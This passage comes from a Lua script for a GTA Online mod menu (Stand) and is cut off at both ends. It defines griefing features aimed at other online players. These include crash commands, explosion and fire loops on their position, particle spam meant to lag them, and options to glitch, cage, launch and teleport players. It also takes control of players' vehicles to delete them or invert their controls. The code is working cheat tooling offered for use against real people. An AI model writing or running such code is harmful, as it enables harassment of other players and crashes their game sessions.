        menu.trigger_commands("blacklist"..PLAYER.GET_PLAYER_NAME(player_id))
    end)

    menu.action(menu.player_root(player_id), "Burger King Foot Lettuce", {}, "Stand's Burger King Foot Lettuce Crash", function()
        menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(player_id))
    end)

    menu.action(menu.player_root(player_id), "Steamroll Crash", {}, "Stand's Crash", function()
        menu.trigger_commands("steamroll"..PLAYER.GET_PLAYER_NAME(player_id))
    end)

    menu.action(malicious, "Clean Up", {"cleanup"}, "Cleans Everything Up \nHere For Redundancy", function()
        menu.trigger_commands("clearworld")
    end)

    menu.toggle_loop(malicious, "Attach All Nearby Entities", {"attachallnearby"}, "Will Likely Get An Access Violation lol \nUse With Caution As You Could Possibly Crash Yourself With This \nCan Cause (X8, XY, A0:38)", function(on_toggle)
        local tar = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        objects = entities.get_all_objects_as_handles()
        vehicles = entities.get_all_vehicles_as_handles()
        peds = entities.get_all_peds_as_handles()
        for i, ent in pairs(peds) do
            if not is_ped_player(ped) then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(ent, tar, 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
            end
        end
        for i, ent in pairs(vehicles) do
            if not is_ped_player(VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)) then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(ent, tar, 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
            end
        end
        for i, ent in pairs(objects) do
            ENTITY.ATTACH_ENTITY_TO_ENTITY(ent, tar, 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
        end
    end)

    local flushes = menu.list(malicious, "Loops", {}, "")

    menu.toggle_loop(flushes, "Loop Explode", {"customexplodeloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z, explosion, 1, true, false, 1, false)
            util.yield(100)
        end
    end)

    menu.toggle_loop(flushes, "Loop Atomize", {"atomizeloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 70, 1, true, false, 1, false)
            util.yield(100)
        end
    end)

    menu.toggle_loop(flushes, "Loop Fireworks", {"fireworkloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 38, 1, true, false, 1, false)
            util.yield(100)
        end
    end)

    menu.toggle_loop(flushes, "Loop Flame", {"flameloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 12, 1, true, false, 1, false)
            util.yield()
        end
    end)

    menu.toggle_loop(flushes, "Loop Water", {"waterloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 13, 1, true, false, 1, false)
            util.yield()
        end
    end)

    menu.divider(malicious, "Other")

    local lagplay = menu.list(malicious, "Lag Player", {}, "")

    menu.toggle_loop(lagplay, "Vehicle Respray Particle", {"rlag"}, "Freeze Player To Make It Work Better", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false
            )
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "Electrical Box Particle", {rlag2}, "Freeze Player To Make It Work Better", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_sht_electrical_box", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false
            )
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "Extinguisher Particle", {rlag3}, "Freeze Player To Make It Work Better", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false
            )
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(trolling, "Infinite Ladder", {}, "Spawns a ladder on this player, legend says those who climb long enough will find God", function()
        local LadderHash = 1122863164 --3469023669
        local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local SpawnOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pedm, 0, 2, 2.5)
            
        if not ENTITY.DOES_ENTITY_EXIST(OBJ) then
            OBJ = entities.create_object(LadderHash, SpawnOffset)
        end

        local SpawnOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pedm, 0, 2, 2.5)
        local Player_Rot = ENTITY.GET_ENTITY_ROTATION(pedm, 2)
    
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(OBJ, SpawnOffset.x, SpawnOffset.y, SpawnOffset.z, false, false, false)
        ENTITY.SET_ENTITY_ROTATION(OBJ, Player_Rot.x, Player_Rot.y, Player_Rot.z, 2, true)
    end, function()
        entities.delete(OBJ)
    end)

    function Get_Entity(entity)
        local tick = 0
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
            local netId = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
            NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, true)
            util.yield()
            tick =  tick + 1
            if tick > 20 then
                if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
                        util.toast("Couldn't Get Control Of Vehicle")
                    return entity
                end
            
            end
        end
        return NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
    end

    glitchiar = menu.list(trolling, "Glitch Options", {}, "")


    player_toggle_loop(glitchiar, player_id, "Bug Movement", {}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(player, false)
        local glitch_hash = util.joaat("prop_shuttering03")
        request_model(glitch_hash)
        local dumb_object_front = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 1, 0))
        local dumb_object_back = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 0, 0))
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_front, false)
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_back, false)
        util.yield()
        entities.delete_by_handle(dumb_object_front)
        entities.delete_by_handle(dumb_object_back)
        util.yield()    
    end)


    local glitch_player_list = menu.list(glitchiar, "Glitch Player", {"glitchdelay"}, "") 
    local object_stuff = {
        names = {
            "Ferris Wheel",
            "UFO",
            "Cement Mixer",
            "Scaffolding",
            "Garage Door",
            "Big Bowling Ball",
            "Big Soccer Ball",
            "Big Orange Ball",
            "Stunt Ramp",
            "Autarch",
            "Plog Door"

        },
        objects = {
            "prop_ld_ferris_wheel",
            "p_spinning_anus_s",
            "prop_staticmixer_01",
            "prop_towercrane_02a",
            "des_scaffolding_roo",
            "prop_sm1_11_garaged",
            "stt_prop_stunt_bowling_ball",
            "stt_prop_stunt_soccer_ball",
            "prop_juicestand",
            "stt_prop_stunt_jump_l",
            "autarch",
            "des_plog_door_start",
        }
    }

    local object_hash = util.joaat("prop_ld_ferris_wheel")
    menu.list_select(glitch_player_list, "Object", {"glitchplayer"}, "Object to use for Glitch Player \nPlog Door, UFO, Autarch & Ferris Wheel Work Best \n(Recommend Using Glitch Vehicle With This)", object_stuff.names, 1, function(index)
        object_hash = util.joaat(object_stuff.objects[index])
    end)

    menu.slider(glitch_player_list, "Spawn Delay", {"spawndelay"}, "", 0, 3000, 50, 10, function(amount)
        delay = amount
    end)

    local glitchPlayer = false
    local glitchPlayer_toggle
    glitchPlayer_toggle = menu.toggle(glitch_player_list, "Glitch Player", {}, "", function(toggled)
        glitchPlayer = toggled

        while glitchPlayer do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
				util.toast("Player is too far. :/")
				menu.set_value(glitchPlayer_toggle, false)
            break end

            if not players.exists(player_id) then 
                util.toast("Player doesn't exist. :/")
                menu.set_value(glitchPlayer_toggle, false)
            util.stop_thread() end

            local glitch_hash = object_hash
            local poopy_butt = util.joaat("rallytruck")
            request_model(glitch_hash)
            request_model(poopy_butt)
            local stupid_object = entities.create_object(glitch_hash, pos)
            local glitch_vehicle = entities.create_vehicle(poopy_butt, pos, 0)
            ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)
            ENTITY.SET_ENTITY_VISIBLE(glitch_vehicle, false)
            ENTITY.SET_ENTITY_INVINCIBLE(stupid_object, true)
            ENTITY.SET_ENTITY_COLLISION(stupid_object, true, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(glitch_vehicle, 1, 0.0, 10, 10, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
            util.yield(delay)
            entities.delete_by_handle(stupid_object)
            entities.delete_by_handle(glitch_vehicle)
            util.yield(delay)    
        end
    end)

    --==Credit To Jinx==--
    local glitchVeh = false
    local glitchVehCmd
    glitchVehCmd = menu.toggle(glitchiar, "Glitch Vehicle", {"glitchvehicle"}, "Might Still Cause A Timeout or Throw An Error \n(Use With Glitch Player For Good Results)", function(toggle)
        glitchVeh = toggle
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_model = players.get_vehicle_model(player_id)
        local ped_hash = util.joaat("a_c_chop")
        local object_hash = util.joaat("des_plog_door_start")
        request_model(ped_hash)
        request_model(object_hash)
        
        while glitchVeh do
            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                util.toast("Player muh away. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            if not players.exists(player_id) then 
                util.toast("The player does not exist")
                menu.set_value(glitchVehCmd, false);
            break end

            if not PED.IS_PED_IN_VEHICLE(ped, player_veh, false) then 
                util.toast("The player is not in a car")
                menu.set_value(glitchVehCmd, false);
            break end

            if not VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                util.toast("There are no seats available")
                menu.set_value(glitchVehCmd, false);
            break end

            local seat_count = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(veh_model)
            local glitch_obj = entities.create_object(object_hash, pos)
            local glitched_ped = entities.create_ped(26, ped_hash, pos, 0)
            local things = {glitched_ped, glitch_obj}

            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitch_obj)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitched_ped)

            ENTITY.ATTACH_ENTITY_TO_ENTITY(glitch_obj, glitched_ped, 0, 0, 0, -0.2--[[y]], 0, 0, 0, true, false, true, 0, true)

            for i, spawned_objects in ipairs(things) do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_objects)
                ENTITY.SET_ENTITY_VISIBLE(spawned_objects, false)
                ENTITY.SET_ENTITY_INVINCIBLE(spawned_objects, true)
            end

            for i = 0, seat_count -1 do
                if VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                    local emptyseat = i
                    for l = 1, 25 do
                        PED.SET_PED_INTO_VEHICLE(glitched_ped, player_veh, emptyseat)
                        ENTITY.SET_ENTITY_COLLISION(glitch_obj, true, true)
                        util.yield()
                    end
                end
            end
            if not menu.get_value(glitchVehCmd) then
                entities.delete_by_handle(glitched_ped)
                entities.delete_by_handle(glitch_obj)
            end
            if glitched_ped ~= nil then
                entities.delete_by_handle(glitched_ped) 
            end
            if glitch_obj ~= nil then 
                entities.delete_by_handle(glitch_obj)
            end
        end
    end)

    local vehtrolling = menu.list(trolling, "Vehicle Trolling", {}, "")

    menu.action(vehtrolling, "Detach Wheels", {}, "Detaches the wheels from the player's vehicle", function()
        local  pname = PLAYER.GET_PLAYER_NAME(player_id)
        local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id) -- get the players model
        if PED.IS_PED_IN_ANY_VEHICLE(pedm, true) then --checking if they are in a vehicle
            local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true) --get the vehicle they are in
            Get_Entity(vmod) --get control
            entities.detach_wheel(vmod, 0)
            entities.detach_wheel(vmod, 1)
            entities.detach_wheel(vmod, 2)
            entities.detach_wheel(vmod, 3)
            entities.detach_wheel(vmod, 4)
            entities.detach_wheel(vmod, 5)
        end   
    end)

    menu.action(vehtrolling, "Burst Tires", {""}, "Button That Burst The Wheels Tires", function ()
        local pname = PLAYER.GET_PLAYER_NAME(player_id)
        local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id) -- get the players model
        if PED.IS_PED_IN_ANY_VEHICLE(pedm, true) then --checking if they are in a vehicle
            local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true) --get the vehicle they are in
        local current_vehicle_handle_or_ptr = entities.get_user_vehicle_as_handle(true)
            if ENTITY.DOES_ENTITY_EXIST(vmod) and Get_Entity(vmod) then --get control
                VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vmod, true)
                for wheelId = 0, 7 do VEHICLE.SET_VEHICLE_TYRE_BURST(vmod, wheelId, true, 1000.0) end
            end
        end
    end)

    menu.action(vehtrolling, "Invert Vehicle Controls", {}, "Inverts players vehicle controls (Permanent)", function ()
        local pname = PLAYER.GET_PLAYER_NAME(player_id)
        local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id) -- get the players model
        if PED.IS_PED_IN_ANY_VEHICLE(pedm, true) then --checking if they are in a vehicle
            local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true) --get the vehicle they are in
            Get_Entity(vmod) --get control
        end  
        local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
        SET_INVERT_VEHICLE_CONTROLS(vmod, true)
    end)

    menu.action(vehtrolling, "Delete Vehicle", {}, "Deletes the players current vehicle", function ()
        local pname = PLAYER.GET_PLAYER_NAME(player_id)
        local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id) -- get the players model
        if PED.IS_PED_IN_ANY_VEHICLE(pedm, true) then --checking if they are in a vehicle
            local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true) --get the vehicle they are in
            Get_Entity(vmod) --get control
            entities.delete_by_handle(vmod)
        end  
    end)
    
    menu.toggle_loop(vehtrolling, "Delete vehicle Loop", {}, "Deletes the players current vehicle over and over", function ()
        local pname = PLAYER.GET_PLAYER_NAME(player_id)
        local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id) -- get the players model
        if PED.IS_PED_IN_ANY_VEHICLE(pedm, true) then --checking if they are in a vehicle
            local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true) --get the vehicle they are in
            Get_Entity(vmod) --get control
            entities.delete_by_handle(vmod)
        end  
    end)

    menu.action(vehtrolling, "Spawn Ramp In Front Of them", {}, "", function() 
        local ramp_hash = util.joaat("stt_prop_ramp_jump_s")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0, 10, -2)
        local rot = ENTITY.GET_ENTITY_ROTATION(ped, 2)
        STREAMING.REQUEST_MODEL(ramp_hash)
    	while not STREAMING.HAS_MODEL_LOADED(ramp_hash) do
    		util.yield()
    	end

        local ramp = OBJECT.CREATE_OBJECT(ramp_hash, pos.x, pos.y, pos.z, true, false, true)

        ENTITY.SET_ENTITY_VISIBLE(ramp, true)
        ENTITY.SET_ENTITY_ROTATION(ramp, rot.x, rot.y, rot.z + 90, 0, true)
        util.yield(2500)
        entities.delete_by_handle(ramp)
    end)

    menu.action(vehtrolling, "Launch Vehicle", {"vehiclefly"}, "Sends players vehicle flying", function()
        send_player_vehicle_flying(player_id)
    end)

    menu.action(vehtrolling, "Cage Vehicle", {"cage"}, "", function()
        local container_hash = util.joaat("benson")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(container_hash)
        local container = entities.create_vehicle(container_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 2.0, 0.0), ENTITY.GET_ENTITY_HEADING(ped))
        spawned_objects[#spawned_objects + 1] = container
        ENTITY.SET_ENTITY_VISIBLE(container, false)
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)

    local teletrolling = menu.list(trolling, "Teleport Trolling", {}, "")

    menu.action(teletrolling, "Send To Jail", {}, "", function()
        local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
        local my_ped = PLAYER.GET_PLAYER_PED(players.user())
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, 1628.5234, 2570.5613, 45.56485, true, false, false, false)
        menu.trigger_commands("givesh " .. PLAYER.GET_PLAYER_NAME(player_id))
        menu.trigger_commands("summon " .. PLAYER.GET_PLAYER_NAME(player_id))
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("otr")
        util.yield(5000)
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("otr")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z)
    end)

    menu.action(teletrolling, "Teleport To The Backrooms", {}, "", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p, true)
        local defx = c.x
        local defy = c.y 
        local defz = c.z
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, true)
        if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
            STREAMING.REQUEST_MODEL(floorbr)
            while not STREAMING.HAS_MODEL_LOADED(floorbr) do
                STREAMING.REQUEST_MODEL(floorbr)
                util.yield()
            end
            STREAMING.REQUEST_MODEL(wallbr)
            while not STREAMING.HAS_MODEL_LOADED(wallbr) do
                STREAMING.REQUEST_MODEL(wallbr)
                util.yield()
            end
            RequestControl(veh)
            local success, floorcoords
            repeat
                success, floorcoords = util.get_ground_z(c.x, c.y)
                util.yield()
            until success
            c.z = floorcoords - 100
            ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, c.z, false, false, false, false)

            local c = ENTITY.GET_ENTITY_COORDS(p)
            local defz = c.z
            c.z = defz - 2
            local spawnedfloorbr = entities.create_object(floorbr, c)
            c.z = c.z + 10
            local spawnedroofbr = entities.create_object(floorbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedroofbr, 180.0, 0.0, 0.0, 1, true)

            defz = c.z - 5
            c.x = c.x + 4
            c.z = defz
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x - 8
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 8
            c.x = defx + 10.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 14.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 7.2
            c.x = defx + 3.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = defy + 6.5
            c.x = defx + 11
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = defx - 12
            c.y = defy + 4
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = defy - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 10
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = defy - 10
            c.x = defx - 19
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = defx - 3
            c.y = defy + 6.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = defx + 25
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x + 7
            c.y = defy
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = defy - 14.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 7
            c.x = c.x - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 7
            c.x = c.x - 7.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x - 6.5
            c.y = c.y - 6.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x - 7.5
            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x - 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x - 6.5
            c.y = c.y + 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x - 7.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x - 6.5
            c.y = c.y + 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 3.1
            c.x = c.x + 5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            util.yield(600)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
            util.yield(500)
            entities.delete_by_handle(veh)
        else
            util.toast(players.get_name(player_id).. " Not in a vehicle")
        end
    end)

    local windmilli = menu.list(trolling, "Windmills", {}, "")

    menu.toggle_loop(windmilli, "Attach Windmills", {"attachmills"}, "", function()
        local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local playerpos = ENTITY.GET_ENTITY_COORDS(id)
        playerpos.z = playerpos.z + 3
        local khanjali = util.joaat("prop_windmill_01")
        STREAMING.REQUEST_MODEL(khanjali)
        while not STREAMING.HAS_MODEL_LOADED(khanjali) do
            util.yield()
        end
        local vehicle1 = entities.create_object(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
            ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
        local vehicle2 = entities.create_object(khanjali, playerpos, 0)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
